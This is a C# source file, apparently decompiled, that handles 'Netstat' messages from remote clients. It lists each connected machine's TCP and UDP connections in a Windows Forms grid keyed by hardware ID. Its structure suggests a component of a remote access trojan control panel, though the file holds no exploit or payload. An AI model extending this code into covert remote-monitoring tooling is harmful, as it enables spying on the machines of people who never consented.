using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerNetstat
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		switch (a)
		{
		case "ListTcp":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormNetstat form2 = (FormNetstat)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView2.Rows.Clear();
				form2.materialLabel1.Text = "Succues list Tcp";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (int)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = "TCP"
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							}
						}
					};
					form2.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			return;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormNetstat form3 = (FormNetstat)client.Tag;
			form3.Invoke((MethodInvoker)delegate
			{
				form3.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			return;
		}
		case "Connect":
		{
			FormNetstat form = (FormNetstat)Application.OpenForms["Netstat:" + (string)objects[2]];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Netstat [" + (string)objects[2] + "]";
				form.client = client;
				form.materialLabel1.Enabled = true;
				form.dataGridView2.Enabled = true;
				form.materialLabel1.Text = "Succues Connect";
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
			return;
		}
		}
		if (!(a == "ListUdp"))
		{
			return;
		}
		if (client.Tag == null)
		{
			client.Disconnect();
			return;
		}
		FormNetstat form4 = (FormNetstat)client.Tag;
		form4.Invoke((MethodInvoker)delegate
		{
			form4.materialLabel1.Text = "Succues list Udp";
			int num = 2;
			while (num < objects.Length)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[num++]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (int)objects[num++]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = "UDP"
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[num++]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = ""
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = ""
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[num++]
						}
					}
				};
				form4.dataGridView2.Rows.Add(dataGridViewRow);
			}
		});
	}
}
